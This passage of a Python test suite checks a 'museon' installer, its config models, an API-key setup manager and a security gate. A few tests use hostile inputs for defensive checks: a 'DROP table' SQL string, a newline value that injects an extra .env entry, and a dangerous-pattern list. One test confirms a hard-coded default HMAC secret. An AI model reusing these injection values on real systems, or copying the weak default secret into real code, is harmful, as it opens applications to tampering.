            if call_count == 2:
                return StepResult(step_name="warn", status=StepStatus.WARNING, message="warning")
            return StepResult(step_name="ok", status=StepStatus.SUCCESS, message="ok")

        for step in InstallerOrchestrator.STEPS:
            setattr(orch, step, make_result)
        results = orch.run()
        assert len(results) == 10

    def test_orc06_run_continues_on_skipped(self, tmp_path):
        """ORC-06: SKIPPED 時繼續"""
        orch = self._make_orchestrator(tmp_path)
        call_count = 0

        def make_result():
            nonlocal call_count
            call_count += 1
            if call_count == 4:
                return StepResult(step_name="skip", status=StepStatus.SKIPPED, message="skipped")
            return StepResult(step_name="ok", status=StepStatus.SUCCESS, message="ok")

        for step in InstallerOrchestrator.STEPS:
            setattr(orch, step, make_result)
        results = orch.run()
        assert len(results) == 10

    def test_orc07_summary_all_success(self, tmp_path):
        """ORC-07: 摘要全部成功"""
        orch = self._make_orchestrator(tmp_path)
        orch.results = [
            StepResult(step_name=f"Step {i}", status=StepStatus.SUCCESS, message=f"ok {i}")
            for i in range(7)
        ]
        summary = orch.generate_summary()
        assert "安裝成功" in summary or "7" in summary

    def test_orc08_summary_with_failure(self, tmp_path):
        """ORC-08: 摘要含失敗"""
        orch = self._make_orchestrator(tmp_path)
        orch.results = [
            StepResult(step_name="Step 1", status=StepStatus.SUCCESS, message="ok"),
            StepResult(step_name="Step 2", status=StepStatus.FAILED, message="error"),
        ]
        summary = orch.generate_summary()
        assert "失敗" in summary

    def test_orc09_summary_mixed_statuses(self, tmp_path):
        """ORC-09: 摘要混合狀態"""
        orch = self._make_orchestrator(tmp_path)
        orch.results = [
            StepResult(step_name="A", status=StepStatus.SUCCESS, message="ok"),
            StepResult(step_name="B", status=StepStatus.WARNING, message="warn"),
            StepResult(step_name="C", status=StepStatus.SKIPPED, message="skip"),
        ]
        summary = orch.generate_summary()
        assert "跳過" in summary

    def test_orc10_day0_daemon_ok(self, tmp_path):
        """ORC-10: daemon 正常的 day0"""
        orch = self._make_orchestrator(tmp_path)
        orch.results = [
            StepResult(step_name="啟動", status=StepStatus.SUCCESS, message="running"),
        ]
        readiness = orch.check_day0_readiness()
        assert "運行中" in readiness or "Gateway" in readiness

    def test_orc11_day0_daemon_failed(self, tmp_path):
        """ORC-11: daemon 失敗的 day0"""
        orch = self._make_orchestrator(tmp_path)
        orch.results = [
            StepResult(step_name="啟動", status=StepStatus.FAILED, message="failed"),
        ]
        readiness = orch.check_day0_readiness()
        assert "時間" in readiness or "日誌" in readiness

    @patch("museon.installer.orchestrator.InstallerOrchestrator._step_environment")
    def test_orc12_step_environment_called(self, mock_step, tmp_path):
        """ORC-12: _step_environment 被呼叫"""
        mock_step.return_value = StepResult(
            step_name="環境檢查", status=StepStatus.FAILED, message="not mac"
        )
        orch = self._make_orchestrator(tmp_path)
        results = orch.run()
        assert mock_step.called
        assert results[0].status == StepStatus.FAILED

    def test_orc13_step_python_env_reuse_venv(self, tmp_path):
        """ORC-13: venv 已存在時跳過建立"""
        # 建立假 venv
        venv_dir = tmp_path / ".runtime" / ".venv"
        python_bin = venv_dir / "bin" / "python"
        python_bin.parent.mkdir(parents=True)
        python_bin.touch()

        orch = self._make_orchestrator(tmp_path)
        # Mock other steps to succeed
        for step in InstallerOrchestrator.STEPS:
            if step != "_step_python_env":
                setattr(orch, step, lambda: StepResult(
                    step_name="x", status=StepStatus.SUCCESS, message="ok"
                ))
        result = orch._step_python_env()
        assert result.status == StepStatus.SUCCESS
        assert "重用" in result.message

    @patch("museon.installer.environment.EnvironmentChecker.find_python", return_value=(None, None))
    def test_orc14_step_python_env_no_python(self, mock_find, tmp_path):
        """ORC-14: 找不到 Python"""
        orch = self._make_orchestrator(tmp_path)
        result = orch._step_python_env()
        assert result.status == StepStatus.FAILED
        assert "Python" in result.message

    def test_orc15_step_api_keys_non_interactive(self, tmp_path):
        """ORC-15: 非互動模式跳過 API keys"""
        orch = self._make_orchestrator(tmp_path, interactive=False)
        result = orch._step_api_keys()
        assert result.status == StepStatus.SKIPPED

    def test_orc16_step_api_keys_interactive(self, tmp_path):
        """ORC-16: 互動模式"""
        orch = self._make_orchestrator(tmp_path, interactive=True)
        result = orch._step_api_keys()
        assert result.status == StepStatus.SUCCESS

    @patch("museon.installer.daemon.DaemonConfigurator.check_health_endpoint")
    def test_orc17_step_launch_success(self, mock_health, tmp_path):
        """ORC-17: 啟動步驟成功"""
        mock_health.return_value = StepResult(
            step_name="健康檢查", status=StepStatus.SUCCESS, message="ok"
        )
        orch = self._make_orchestrator(tmp_path)
        result = orch._step_launch()
        assert result.status == StepStatus.SUCCESS

    @patch("museon.installer.daemon.DaemonConfigurator.check_health_endpoint")
    def test_orc18_step_launch_warning(self, mock_health, tmp_path):
        """ORC-18: 啟動步驟 — Gateway 未就緒"""
        mock_health.return_value = StepResult(
            step_name="健康檢查", status=StepStatus.WARNING, message="not ready"
        )
        orch = self._make_orchestrator(tmp_path)
        result = orch._step_launch()
        assert result.status == StepStatus.WARNING

    @patch("museon.installer.orchestrator.subprocess.Popen")
    @patch("pathlib.Path.exists")
    def test_orc19_try_open_dashboard_exists(self, mock_exists, mock_popen, tmp_path):
        """ORC-19: Dashboard.app 存在"""
        mock_exists.return_value = True
        orch = self._make_orchestrator(tmp_path)
        orch.try_open_dashboard()
        # subprocess.Popen should be called
        mock_popen.assert_called_once()

    @patch("museon.installer.orchestrator.subprocess.Popen")
    @patch("pathlib.Path.exists")
    def test_orc20_try_open_dashboard_not_exists(self, mock_exists, mock_popen, tmp_path):
        """ORC-20: Dashboard.app 不存在"""
        mock_exists.return_value = False
        orch = self._make_orchestrator(tmp_path)
        # 不應拋出異常
        orch.try_open_dashboard()
        mock_popen.assert_not_called()

    def test_orc21_summary_format(self, tmp_path):
        """ORC-21: 摘要包含框線"""
        orch = self._make_orchestrator(tmp_path)
        orch.results = [
            StepResult(step_name="Test", status=StepStatus.SUCCESS, message="ok"),
        ]
        summary = orch.generate_summary()
        assert "═" in summary or "╔" in summary

    def test_orc22_summary_status_icons(self, tmp_path):
        """ORC-22: 摘要包含狀態圖示"""
        orch = self._make_orchestrator(tmp_path)
        orch.results = [
            StepResult(step_name="OK", status=StepStatus.SUCCESS, message="ok"),
            StepResult(step_name="WARN", status=StepStatus.WARNING, message="warn"),
        ]
        summary = orch.generate_summary()
        assert "✅" in summary
        assert "⚠" in summary

    def test_orc23_day0_with_dashboard(self, tmp_path):
        """ORC-23: day0 有 Dashboard"""
        orch = self._make_orchestrator(tmp_path)
        orch.results = [
            StepResult(step_name="啟動", status=StepStatus.SUCCESS, message="ok"),
            StepResult(step_name="Electron", status=StepStatus.SUCCESS, message="ok"),
        ]
        readiness = orch.check_day0_readiness()
        assert "Dashboard" in readiness or "Telegram" in readiness

    def test_orc24_config_gateway_port(self, tmp_path):
        """ORC-24: 預設 gateway_port"""
        config = InstallConfig(install_dir=tmp_path)
        assert config.gateway_port == 8765

    def test_orc25_config_min_disk(self, tmp_path):
        """ORC-25: 預設 min_disk_mb"""
        config = InstallConfig(install_dir=tmp_path)
        assert config.min_disk_mb == 500


# ═══════════════════════════════════════════════════════════════
# Section 10：Models 和資料結構 (15 tests)
# ═══════════════════════════════════════════════════════════════


class TestModelsDataStructures:
    """MDL-01 ~ MDL-15: 資料模型邊界情況"""

    def test_mdl01_step_status_enum(self):
        """MDL-01: StepStatus 列舉值"""
        assert StepStatus.PENDING.value == "pending"
        assert StepStatus.SUCCESS.value == "success"
        assert StepStatus.WARNING.value == "warning"
        assert StepStatus.SKIPPED.value == "skipped"
        assert StepStatus.FAILED.value == "failed"

    def test_mdl02_step_result_is_ok_success(self):
        """MDL-02: SUCCESS is_ok = True"""
        r = StepResult(step_name="t", status=StepStatus.SUCCESS, message="ok")
        assert r.is_ok is True

    def test_mdl03_step_result_is_ok_warning(self):
        """MDL-03: WARNING is_ok = True"""
        r = StepResult(step_name="t", status=StepStatus.WARNING, message="warn")
        assert r.is_ok is True

    def test_mdl04_step_result_is_ok_skipped(self):
        """MDL-04: SKIPPED is_ok = True"""
        r = StepResult(step_name="t", status=StepStatus.SKIPPED, message="skip")
        assert r.is_ok is True

    def test_mdl05_step_result_is_ok_failed(self):
        """MDL-05: FAILED is_ok = False"""
        r = StepResult(step_name="t", status=StepStatus.FAILED, message="fail")
        assert r.is_ok is False

    def test_mdl06_step_result_is_fatal_failed(self):
        """MDL-06: FAILED is_fatal = True"""
        r = StepResult(step_name="t", status=StepStatus.FAILED, message="fail")
        assert r.is_fatal is True

    def test_mdl07_step_result_is_fatal_success(self):
        """MDL-07: SUCCESS is_fatal = False"""
        r = StepResult(step_name="t", status=StepStatus.SUCCESS, message="ok")
        assert r.is_fatal is False

    def test_mdl08_step_result_details_optional(self):
        """MDL-08: details 可選"""
        r = StepResult(step_name="t", status=StepStatus.SUCCESS, message="ok")
        assert r.details is None

    def test_mdl09_install_config_post_init(self, tmp_path):
        """MDL-09: InstallConfig 自動初始化路徑"""
        config = InstallConfig(install_dir=tmp_path)
        assert config.project_dir == tmp_path / ".runtime"
        assert config.venv_dir == tmp_path / ".runtime" / ".venv"
        assert config.electron_dir == tmp_path / ".runtime" / "electron"
        assert config.data_dir == tmp_path / "data"
        assert config.log_dir == tmp_path / "logs"
        assert config.env_file == tmp_path / ".env"

    def test_mdl10_install_config_plist_path(self, tmp_path):
        """MDL-10: plist_path"""
        config = InstallConfig(install_dir=tmp_path)
        assert "LaunchAgents" in str(config.plist_path)

    def test_mdl11_install_config_venv_python(self, tmp_path):
        """MDL-11: venv_python"""
        config = InstallConfig(install_dir=tmp_path)
        assert config.venv_python == tmp_path / ".runtime" / ".venv" / "bin" / "python"

    def test_mdl12_install_config_gateway_log(self, tmp_path):
        """MDL-12: gateway_log"""
        config = InstallConfig(install_dir=tmp_path)
        assert config.gateway_log == tmp_path / "logs" / "gateway.log"

    def test_mdl13_install_config_defaults(self, tmp_path):
        """MDL-13: 預設值"""
        config = InstallConfig(install_dir=tmp_path)
        assert config.gateway_port == 8765
        assert config.min_disk_mb == 500
        assert config.gateway_host == "127.0.0.1"

    def test_mdl14_system_info_defaults(self):
        """MDL-14: SystemInfo 預設值"""
        info = SystemInfo()
        assert info.os_type == ""
        assert info.arch == ""
        assert info.python_path is None
        assert info.has_npm is False
        assert info.disk_free_mb == 0

    def test_mdl15_step_result_str(self):
        """MDL-15: StepResult 可轉字串"""
        r = StepResult(step_name="test", status=StepStatus.SUCCESS, message="ok")
        s = str(r)
        assert "test" in s or "SUCCESS" in s or "ok" in s


# ═══════════════════════════════════════════════════════════════
# Section 11：額外邊界情境 (bonus 20+ tests)
# 跨模組整合與真實世界問題
# ═══════════════════════════════════════════════════════════════


class TestCrossModuleEdgeCases:
    """EXTRA-01 ~ EXTRA-20+: 跨模組整合邊界"""

    def test_extra01_setup_manager_read_key_value(self, tmp_path):
        """EXTRA-01: _read_key_value 正常讀取"""
        env_file = tmp_path / ".env"
        env_file.write_text("ANTHROPIC_API_KEY=sk-ant-test123\n")
        manager = SetupManager()
        val = manager._read_key_value(env_file, "ANTHROPIC_API_KEY")
        assert val == "sk-ant-test123"

    def test_extra02_setup_manager_read_key_missing(self, tmp_path):
        """EXTRA-02: _read_key_value key 不存在"""
        env_file = tmp_path / ".env"
        env_file.write_text("OTHER=val\n")
        manager = SetupManager()
        val = manager._read_key_value(env_file, "MISSING_KEY")
        assert val == ""

    def test_extra03_setup_manager_read_key_no_file(self, tmp_path):
        """EXTRA-03: _read_key_value 檔案不存在"""
        manager = SetupManager()
        val = manager._read_key_value(tmp_path / ".env", "ANY")
        assert val == ""

    def test_extra04_anthropic_key_with_spaces(self):
        """EXTRA-04: key 前後有空格仍驗證通過"""
        manager = SetupManager()
        valid, msg = manager.validate_anthropic_key("  sk-ant-api03-validkey123  ")
        assert valid is True

    def test_extra05_telegram_token_with_spaces(self):
        """EXTRA-05: token 前後有空格仍驗證通過"""
        manager = SetupManager()
        valid, msg = manager.validate_telegram_token("  123456:ABCdefGHIjklMNO  ")
        assert valid is True

    def test_extra06_only_whitespace_anthropic_key(self):
        """EXTRA-06: 只有空格的 key"""
        manager = SetupManager()
        valid, msg = manager.validate_anthropic_key("   ")
        assert valid is False

    def test_extra07_only_whitespace_telegram_token(self):
        """EXTRA-07: 只有空格的 token"""
        manager = SetupManager()
        valid, msg = manager.validate_telegram_token("   ")
        assert valid is False

    def test_extra08_security_gate_default_secret(self):
        """EXTRA-08: SecurityGate 預設 secret"""
        gate = SecurityGate()
        assert gate._hmac_secret == "default_secret_change_me"

    def test_extra09_security_gate_custom_rate_limit(self):
        """EXTRA-09: 自訂速率限制"""
        gate = SecurityGate(rate_limit_per_minute=10)
        assert gate._rate_limit == 10

    def test_extra10_dangerous_patterns_count(self):
        """EXTRA-10: 危險模式數量"""
        assert len(SecurityGate.DANGEROUS_PATTERNS) >= 10

    def test_extra11_sanitize_case_insensitive(self):
        """EXTRA-11: 清理大小寫不敏感"""
        gate = SecurityGate()
        with pytest.raises(ValueError):
            gate.sanitize_input("DROP table users")  # mixed case

    def test_extra12_validate_source_all_allowed(self):
        """EXTRA-12: 所有允許的來源"""
        gate = SecurityGate()
        for src in ["telegram", "line", "webhook", "electron", "heartbeat", "cron"]:
            assert gate.validate_source(src) is True

    def test_extra13_install_config_gateway_err(self, tmp_path):
        """EXTRA-13: gateway_err 路徑"""
        config = InstallConfig(install_dir=tmp_path)
        assert config.gateway_err == tmp_path / "logs" / "gateway.err"

    def test_extra14_install_config_plist_name(self, tmp_path):
        """EXTRA-14: 預設 plist 名稱"""
        config = InstallConfig(install_dir=tmp_path)
        assert config.plist_name == "com.museon.gateway"

    def test_extra15_write_key_newline_in_value(self, tmp_path):
        """EXTRA-15: 值包含換行符（邊界 bug）"""
        env_file = tmp_path / ".env"
        env_file.write_text("")
        config = ApiKeyConfigurator()
        # 值包含 \n 會破壞 .env 格式
        config.write_key(env_file, "KEY", "value\nEVIL=injected")
        content = env_file.read_text()
        # 這個測試記錄了一個潛在 bug：
        # write_key 不驗證值是否包含換行符
        assert "KEY=" in content

    def test_extra16_mask_value_boundary_8(self):
        """EXTRA-16: 剛好 8 字元的遮罩"""
        manager = SetupManager()
        masked = manager._mask_value("12345678")
        # len <= 8: first 3 + "***"
        assert masked == "123***"

    def test_extra17_mask_value_boundary_9(self):
        """EXTRA-17: 9 字元的遮罩"""
        manager = SetupManager()
        masked = manager._mask_value("123456789")
        # len > 8: first 8 + "***"
        assert masked == "12345678***"

    def test_extra18_has_key_with_value_whitespace_only(self, tmp_path):
        """EXTRA-18: key 值只有空格"""
        env_file = tmp_path / ".env"
        env_file.write_text("KEY=   \n")
        config = ApiKeyConfigurator()
        # 值是 "   "，strip() 後為空 → False
        assert config.has_key(env_file, "KEY") is False

    def test_extra19_env_checker_min_python_version(self):
        """EXTRA-19: MIN_PYTHON_VERSION 為 (3, 11)"""
        checker = EnvironmentChecker()
        assert checker.MIN_PYTHON_VERSION == (3, 11)

    def test_extra20_step_result_with_details(self):
        """EXTRA-20: StepResult 含 details"""
        r = StepResult(
            step_name="test",
            status=StepStatus.SUCCESS,
            message="ok",
            details={"key": "value"},
        )
        assert r.details == {"key": "value"}

    @patch("museon.gateway.setup_handlers.urllib.request.urlopen")
    def test_extra21_telegram_no_username(self, mock_urlopen):
        """EXTRA-21: Telegram bot 沒有 username"""
        mock_resp = MagicMock()
        mock_resp.status = 200
        mock_resp.read.return_value = json.dumps({
            "ok": True,
            "result": {"first_name": "MyBot"}
        }).encode()
        mock_resp.__enter__ = lambda s: s
        mock_resp.__exit__ = MagicMock(return_value=False)
        mock_urlopen.return_value = mock_resp
        manager = SetupManager()
        success, msg = manager.test_telegram_connection("123:abc")
        assert success is True
        assert "MyBot" in msg

    @patch("museon.gateway.setup_handlers.urllib.request.urlopen")
    def test_extra22_telegram_api_not_ok(self, mock_urlopen):
        """EXTRA-22: Telegram API 回應 ok=false"""
        mock_resp = MagicMock()
        mock_resp.status = 200
        mock_resp.read.return_value = json.dumps({"ok": False}).encode()
        mock_resp.__enter__ = lambda s: s
        mock_resp.__exit__ = MagicMock(return_value=False)
        mock_urlopen.return_value = mock_resp
        manager = SetupManager()
        success, msg = manager.test_telegram_connection("123:abc")
        assert success is False
        assert "異常" in msg

    @patch("museon.gateway.setup_handlers.urllib.request.urlopen")
    def test_extra23_anthropic_generic_exception(self, mock_urlopen):
        """EXTRA-23: Anthropic 連線拋出一般異常"""
        mock_urlopen.side_effect = Exception("network error")
        manager = SetupManager()
        success, msg = manager.test_anthropic_connection("sk-ant-valid")
        assert success is False
        assert "失敗" in msg

    def test_extra24_rate_limit_exact_boundary(self):
        """EXTRA-24: 速率限制剛好在邊界"""
        gate = SecurityGate(rate_limit_per_minute=3)
        assert gate.check_rate_limit("user") is True  # 1
        assert gate.check_rate_limit("user") is True  # 2
        assert gate.check_rate_limit("user") is True  # 3
        assert gate.check_rate_limit("user") is False  # 4 - exceeded

    def test_extra25_sanitize_empty_string(self):
        """EXTRA-25: 清理空字串"""
        gate = SecurityGate()
        result = gate.sanitize_input("")
        assert result == ""

    def test_extra26_sanitize_unicode(self):
        """EXTRA-26: 清理 Unicode 文字"""
        gate = SecurityGate()
        result = gate.sanitize_input("你好世界 🌍 こんにちは")
        assert result == "你好世界 🌍 こんにちは"

    def test_extra27_setup_done_key_constant(self):
        """EXTRA-27: SETUP_DONE_KEY 常數"""
        assert SetupManager.SETUP_DONE_KEY == "MUSEON_SETUP_DONE"

    def test_extra28_env_template_has_comments(self):
        """EXTRA-28: ENV_TEMPLATE 有註解"""
        template = ApiKeyConfigurator.ENV_TEMPLATE
        assert "#" in template

    def test_extra29_write_key_to_new_file(self, tmp_path):
        """EXTRA-29: write_key 對不存在的檔案"""
        env_file = tmp_path / ".env"
        config = ApiKeyConfigurator()
        result = config.write_key(env_file, "NEW_KEY", "value")
        assert result.status == StepStatus.SUCCESS
        assert env_file.exists()
        assert "NEW_KEY=value" in env_file.read_text()

    @pytest.mark.asyncio
    async def test_extra30_session_lock_state(self):
        """EXTRA-30: 鎖定狀態一致性"""
        manager = SessionManager()
        await manager.acquire("s1")
        assert manager.is_processing("s1") is True
        assert manager._locks["s1"].locked() is True
        await manager.release("s1")
        assert manager.is_processing("s1") is False
        assert manager._locks["s1"].locked() is False
